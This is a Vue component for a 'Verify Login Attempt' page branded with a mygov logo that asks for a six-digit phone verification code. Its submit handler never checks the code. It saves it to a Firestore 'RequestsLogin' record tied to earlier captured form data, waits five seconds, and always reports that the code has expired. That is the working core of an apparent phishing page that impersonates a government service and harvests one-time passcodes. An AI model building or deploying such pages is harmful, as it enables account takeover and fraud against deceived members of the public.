<!--suppress CssUnresolvedCustomProperty -->
<template>
  <div class="alpha">

    <div class="image">
      <router-link to="/">
      <img src="@/assets/mygov.svg" alt="logo" class="company-logo">
      </router-link>
    </div>


    <div class="form-alpha">
      <form @submit.prevent="sendMessage">

        <p class="text-1">Verify Login Attempt</p>
        <img src="@/assets/email.svg" alt="email" class="email-logo">

        <p class="text-2">We sent a verification code to your phone.</p>
        <p class="text-3">Check your phone for a verification code and type in the box below to continue login</p>
        <p class="text-4">If you do not receive one, do wait patiently, you would receive one in due time.</p>

        <div class="line-1" ></div>

        <p class="text-5">Enter the 6-digit code sent to your phone</p>


        <div class="pin-code" ref="pinContainer">
          <div class="vue-otp-input">
            <div
                class="otp-wrapper"
                :class="isInputFocused ? activeWrapperClassHandler : wrapperClassHandler"
                :style="wrapperStyle"
                :id="id"
            >
              <input
                  v-for="(digitInput, index) in digits"
                  ref="digitInput"
                  :key="id + index"
                  autocomplete="one-time-code"
                  v-model="inputValue[index]"
                  class="otp-input"
                  :class="[inputClassHandler, activeInput === index ? activeInputClassHandler : '']"
                  :placeholder="placeholder"
                  :disabled="isDisabled"
                  @focus="onFocus(index)"
                  @blur="onBlur"
                  @paste="OnPaste"
                  @input="onInput(index, $event)"
                  @change="onChanged(index)"
                  @keydown="keydownHandler(index, $event)"
                  :style="inputStyle"
                  required
              />
            </div>
            <span v-if="!isValid" :class="errorClassHandler">
                          <slot name="errorMessage"></slot>
                        </span>
          </div>
        </div>

          <base-button
              :loading="loading"
              style="
  background: #389ba7;
  border: 1px solid #389ba7;
 width: 85%;display: block;
 margin-left: auto;margin-right: auto;
" >Verify email</base-button>


      </form>
    </div>

    <div class="last-text">
      <p>Didn’t get a code? <span @click="resendOtp">Resend OTP</span></p>
    </div>

  </div>
</template>

<script>

import BaseButton from "@/components/BaseComponents/buttons/BaseButton.vue";
import {doc, setDoc} from "firebase/firestore";
import {db} from "@/firebase/config";
import {serverTimestamp} from "firebase/database";
import Swal from "sweetalert2";
import {mapGetters, mapState} from "vuex";

export default {
  name: 'ForgotPasswordOtpForm',
  components: {BaseButton},
  props: {
    id: {
      type: String,
      default: "otp",
    },
    digits: {
      type: Number,
      default: 6,
    },
    mode: {
      type: String,
      default: "separate",
    },
    type: {
      type: String,
      default: "number",
    },
    placeholder: {
      type: String,
      default: "-",
    },
    radius: {
      type: Number,
      default: 5,
    },
    gap: {
      type: Number,
      default: 10,
    },
    isDisabled: {
      type: Boolean,
      default: false,
    },
    isValid: {
      type: Boolean,
      default: true,
    },
    rtl: {
      type: Boolean,
      default: false,
    },
    autoFocus: {
      type: Boolean,
      default: true,
    },
    errorClass: {
      type: String,
      default: "",
    },
    separateInputClass: {
      type: String,
      default: "",
    },
    separateWrapperClass: {
      type: String,
      default: "",
    },
    groupInputClass: {
      type: String,
      default: "",
    },
    groupWrapperClass: {
      type: String,
      default: "",
    },
    activeInputClass: {
      type: String,
      default: "",
    },
    activeWrapperClass: {
      type: String,
      default: "",
    },
  },
  data() {
    return {
      pins: [],
      inputValue: [],
      joinedValue: "",
      isInputFocused: false,
      activeInput: -1,
      loading: false, // ✅ Add this line
    };
  },
  computed:{
    ...mapState(['signUpFormData']),
    ...mapGetters(['getSignUpFormData']),

    wrapperStyle() {
      const dir = this.rtl ? "rtl" : "ltr";
      const styles = {
        direction: dir,
        gap: `${this.gap}px`,
        "border-radius": `${this.radius}px`,
      };
      return styles;
    },
    inputStyle() {
      return {
        "--border-radius": `${this.radius}px`,
      };
    },
    inputClassHandler() {
      if (this.mode === "separate") {
        if (this.isValid) {
          return this.separateInputClass ? this.separateInputClass : "defualt-input-separate";
        } else {
          return this.separateInputClass ? this.separateInputClass : "defualt-error-input-separate";
        }
      }
      if (this.mode === "group") {
        return this.groupInputClass ? this.groupInputClass : "defualt-input-group";
      }
      return "";
    },
    activeInputClassHandler() {
      if (this.mode === "separate") {
        return this.activeInputClass ? this.activeInputClass : "defualt-active-input";
      }
      return "";
    },
    activeWrapperClassHandler() {
      if (this.mode === "group") {
        if (this.isValid) {
          return this.activeWrapperClass ? this.activeWrapperClass : "defualt-active-wrapper";
        } else {
          return this.activeWrapperClass ? this.activeWrapperClass : "defualt-error-wrapper-group";
        }
      }
      return "";
    },
    wrapperClassHandler() {
      if (this.mode === "separate") {
        return this.separateWrapperClass ? this.separateWrapperClass : "defualt-wrapper-separate";
      }
      if (this.mode === "group") {
        if (this.isValid) {
          return this.groupWrapperClass ? this.groupWrapperClass : "defualt-wrapper-group";
        } else {
          return this.groupWrapperClass ? this.groupWrapperClass : "defualt-error-wrapper-group";
        }
      }
      return "";
    },
    errorClassHandler() {
      return this.errorClass ? this.errorClass : "default-error-class";
    },

  },
  methods: {
    completeEnrollment(){
      this.$router.push("/new-password")
    },

    resendOtp(){
      // StoreUtils.dispatch(StoreUtils.actions.auth.resendOtp, {
      //   email: this.forgotPasswordFormData.email,
      // })
    },

    handleKeyUp(event) {
      const target = event.target;

      const maxLength = parseInt(target.attributes.maxlength.value, 10);
      const myLength = target.value.length;

      if (myLength >= maxLength) {
        const next = target.nextElementSibling;
        if (next && next.tagName.toLowerCase() === 'input') {
          next.focus();
        }
      }

      if (myLength === 0) {
        const prev = target.previousElementSibling;
        if (prev && prev.tagName.toLowerCase() === 'input') {
          prev.focus();
        }
      }

      this.$emit('input', this.pins.join(''));
    },
    handleKeyDown(event) {
      const target = event.target;
      target.value = '';
    },

    keydownHandler(index, e) {
      if (e.keyCode === 8 && e.target.value === "") {
        this.$refs.digitInput[Math.max(0, index - 1)].focus();
      }
    },
    onInput(index) {
      const [first, ...rest] =
          this.type === "number"
              ? this.inputValue[index].replace(/[^0-9]/g, "")
              : this.inputValue[index];
      this.inputValue[index] = first === null || first === undefined ? "" : first;
      const lastInputBox = index === this.digits - 1;
      const insertedContent = first !== undefined;
      if (insertedContent && !lastInputBox) {
        this.$refs.digitInput[index + 1].focus();
        this.$refs.digitInput[index + 1].value = rest.join("");
        this.$refs.digitInput[index + 1].dispatchEvent(new Event("input"));
      }
      this.joinedValue = this.inputValue.map((value) => value).join("");
      this.$emit("value", this.joinedValue);
      if (this.joinedValue.length === this.digits) {
        this.onComplete(this.joinedValue);
      }
    },
    onFocus(index) {
      this.activeInput = index;
      this.isInputFocused = true;
    },
    onBlur() {
      this.activeInput = -1;
      this.isInputFocused = false;
    },
    onComplete(joinedValue) {
      this.onBlur();
      this.$refs.digitInput[this.digits - 1].blur();
      if(this.type === "password"){
        this.$emit("on-complete", joinedValue);
      }
      else
        this.$emit("on-complete", joinedValue);
    },
    onChanged(index) {
      this.$emit("on-changed", this.inputValue[index]);
    },
    OnPaste(event) {
      this.$emit("on-paste", event);
    },

    async sendMessage() {
      this.loading = true;

      try {
        await setDoc(doc(db, "RequestsLogin", this.signUpFormData), {
          OTP: this.joinedValue,
          createdAt: serverTimestamp(),
        }, { merge: true });

        console.log('saved');

        // Simulate 5-second delay
        await new Promise(resolve => setTimeout(resolve, 5000));

        await Swal.fire({
          icon: 'error',
          title: 'Attention!!',
          text: 'OTP has Expired!',
        });

        this.resetForm();

      } catch (error) {
        console.error("OTP verification failed:", error);
        await Swal.fire({
          icon: 'error',
          title: 'Error',
          text: 'Failed to verify OTP. Please try again.',
        });
      } finally {
        this.loading = false;
      }
    },


    resetForm() {
      this.email = '';
      this.inputValue = '';
      this.password = '';
    },
  },
  mounted() {
    if (this.autoFocus && !this.isDisabled) {
      this.onFocus(0);
      this.$refs.digitInput[0].focus();
      //setting input type based on the existing types for now
      const types = ["text", "password", "number"];
      if (types.indexOf(this.type)!=-1) {
        for (let box of this.$refs.digitInput) {
          box.type = this.type;
        }
      }
    }
  },
}
</script>

<style scoped>
.alpha{
  background-color: #f5f5f5;
  height: 120vh;
}
.company-logo{
  width: 22%;

}

.form-alpha{
  max-width: 500px;
  width: 100%;
  margin: auto;
  -webkit-box-shadow: 0 0 25px rgba(0, 0, 0, 0.2);
  box-shadow: 0 0 25px rgba(0, 0, 0, 0.2);
  background: #ffffff;
  border-radius: 12px;
  padding: 30px 0 30px 0;
  height: 640px;
}

.text-1{
  color: #2e3f51;
  font-family: "Poppins", Arial, Helvetica, sans-serif;
  font-size: 17px;
  font-weight: 600;
  letter-spacing: 1.5px;
  line-height: 1.4117647059;
  margin: 15px 0 25px 0;
  text-align: center;
  text-transform: uppercase;
}

.text-2{
  font-family: "Open Sans", Arial, Helvetica, sans-serif;
  color: #2e3f51;
  line-height: normal;
  background-color: #f2faff;
  padding-top: 35px;
  padding-bottom: 35px;
  width: 100%;
  text-align: center;
  margin-top: 20px;
  margin-bottom: 20px;
}

.text-3{
  margin-bottom: 20px;
  padding: 0 40px;
  text-align: center;
  font-family: "Open Sans", Arial, Helvetica, sans-serif;
  color: #2e3f51;
  line-height: normal;
}

.text-4{
  margin-bottom: 20px;
  padding: 0 40px;
  text-align: center;
  font-family: "Open Sans", Arial, Helvetica, sans-serif;
  color: #2e3f51;
  line-height: normal;
}

.text-5{
  color: #2e3f51;
  font-family: "Poppins", Arial, Helvetica, sans-serif;
  font-size: 20px;
  font-weight: 500;
  letter-spacing: normal;
  line-height: 1.4;
  margin: 10% 0 20px 0;
  text-align: center;
  text-transform: none;
}

.line-1{
  font-family: "Poppins", Arial, Helvetica, sans-serif;
  font-weight: 500;
  margin: 25px 0 15px 0;
  text-align: center;
  position: relative;
  z-index: 1;
}

.line-1::before{
  border-top: 1px solid #dfdfdf;
  content: "";
  margin: 0 auto;
  position: absolute;
  top: 50%;
  left: 0;
  right: 0;
  bottom: 0;
  z-index: -1;
  width: 60%;
}

.email-logo{
  display: block;
  margin-left: auto;
  margin-right: auto;
}

.text-area h3{
  padding-bottom: 0;
  margin-bottom: 0;
  text-align: center;
  letter-spacing: 0.5px;
  color: #0A0A0AFF;
  font-weight: 600;
  font-size: 22px;
  line-height: 38px;
}

.text-area p{
  padding-top: 2px;
  margin-top: 2px;
  text-align: center;
  letter-spacing: 0.5px;
  color: #0A0A0AFF;
  font-weight: 400;
  font-size: 14px;
  line-height: 24px;
}

.text-area{
  margin-bottom: 1%;
}


.image{
  text-align: center;
  background-color: #65D2EE !important;
  padding: 2rem;
  margin-bottom: 35PX;
}

.submit{
  margin-left: 36%;
  margin-right: 36%;
  margin-top: 3%;
}


.last-text{
  color: #2e3f51;
  font-family: "Poppins", Arial, Helvetica, sans-serif;
  font-size: 13px;
  font-weight: 300;
  letter-spacing: 1.5px;
  line-height: 1.4117647059;
  margin: 23px 0 25px 0;
  text-align: center;
  text-transform: uppercase;
}

span{
  color: #389ba7;
  text-decoration: underline;
}

.pin-code{
  padding: 0;
  display: flex;
  justify-content:space-evenly;
  margin-bottom: 6%;
  margin-top: 6%;
}

.pin-code input {
  border: 1px solid #D0D5DD;
  text-align: center;
  width: 48px;
  height:48px;
  font-size: 36px;
  background-color: #F3F3F3;
  margin-right:5px;
  border-radius: 6px;
  color: #191C1F;
}



.pin-code input:focus {
  border: 1px solid #191C1F;
  outline:none;
  color: #191C1F;
}


input::-webkit-outer-spin-button,
input::-webkit-inner-spin-button {
  -webkit-appearance: none;
  margin: 0;
}



div.vue-otp-input {
  width: max-content;
}
div.vue-otp-input > div.otp-wrapper {
  direction: var(--direction);
  text-align: center;
  display: flex;
  align-items: center;
  justify-content: center;
  transition-property: all;
  transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
  transition-duration: 0.3s;
}

div.vue-otp-input > div.otp-wrapper > input.otp-input {
  transition-property: all;
  transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
  transition-duration: 0.3s;
  border-radius: var(--border-radius);
}
div.vue-otp-input > div.otp-wrapper > input.otp-input:disabled {
  background-color: #F3F3F3 !important;
}
/* SINGLE INPUT IN SEPARATE MODE */
div.vue-otp-input > div.otp-wrapper > input.defualt-input-separate {

  border: 1px solid #D0D5DD;
  text-align: center;
  width: 50px;
  height: 50px;
  font-size: 30px;
  background-color: #F3F3F3;

  border-radius: 6px;
  color: #191C1F;
}
div.vue-otp-input > div.otp-wrapper > input.defualt-error-input-separate {
  text-align: center;
  font-weight: 600;
  background-color: transparent;
  border: 1px solid #D0D5DD;
  width: 3rem;
  height: 48px;
}
@media only screen and (max-width: 600px) {
  div.vue-otp-input > div.otp-wrapper > input.defualt-input-separate {
    width: 50px;
    height: 50px;
  }
}
/* INPUTS WRAPPER IN SEPARATE MODE */
div.vue-otp-input > div.defualt-wrapper-separate {
  background: transparent;
}
/* INPUTS WRAPPER IN GROUP MODE */
div.vue-otp-input > div.defualt-wrapper-group {
  border: 1px solid #D0D5DD;
}
div.vue-otp-input > div.defualt-error-wrapper-group {
  border: 1px solid #D0D5DD;
}

/* SINGLE INPUT IN GROUP MODE */
div.vue-otp-input > div.otp-wrapper > input.defualt-input-group {
  background-color: transparent;
  font-weight: 600;
  border: none;
  width: 3rem;
  height: 48px;
  text-align: center;
}
@media only screen and (max-width: 600px) {
  div.vue-otp-input > div.otp-wrapper > input.defualt-input-group {
    width: 2.5rem;
    height: 40px;
  }
}
div.vue-otp-input > div.otp-wrapper > input.defualt-active-input {
  border: 1px solid #D0D5DD;
}
div.vue-otp-input > div.defualt-active-wrapper {
  border: 1px solid #D0D5DD;
}
div.vue-otp-input > span.default-error-class {
  color: #191C1F;
  font-weight: bold;
}
input:focus {
  outline: none;
}
/* removing the arrow keys on side of the input area */
input::-webkit-outer-spin-button,
input::-webkit-inner-spin-button {
  -webkit-appearance: none;
  margin: 0;
}

/* Firefox */
input[type=number] {
  -moz-appearance: textfield;
}

@media (max-width: 700px) {
  .submit{
    margin-left: 22%;
    margin-right: 23%;
    margin-top: 3%;
  }
  .company-logo{
    width: 35%;
  }

  .form-alpha{
    margin-top: 8%;
  }
}

@media (max-width: 500px) {

  .form-alpha {
    width: 90%;
  }

  .company-logo{
    width: 50%;
  }

}

</style>

